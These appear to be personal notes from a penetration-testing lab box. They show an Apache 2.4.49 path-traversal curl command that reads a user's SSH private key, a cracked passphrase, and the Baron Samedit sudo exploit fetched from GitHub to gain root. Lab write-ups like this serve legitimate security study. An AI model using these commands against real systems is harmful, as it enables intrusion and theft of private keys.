# Exploitation
- Port `80` is running `Apache 2.4.49` which is vulnerable to directory traversal. Can be leverage to find potential users and `authorized_keys` for user `anita`.![[Pasted image 20240219190523.png]]![[Pasted image 20240219190446.png]]
- Run `curl http://192.168.205.245/cgi-bin/.%2e/.%2e/.%2e/.%2e/home/anita/.ssh/id_ecdsa` will reveal the SSH private key.![[Pasted image 20240224180110.png]]
	- Note the key file here is `id_ecdsa` !!!!
- `john` will identify the passphrase as `fireball`.![[Pasted image 20240224181248.png]]
# PrivEsc
- `linpeas` will identify that target is potentially vulnerable to `sudo Baron Samedit`.![[Pasted image 20240224185207.png]]
- Retrieve the exploit from `https://codeload.github.com/blasty/CVE-2021-3156/zip/main` and transfer to target.
- Run `make` and `./sudo-hax-me-a-sandwich 1` to get a root shell.![[Pasted image 20240224185347.png]]
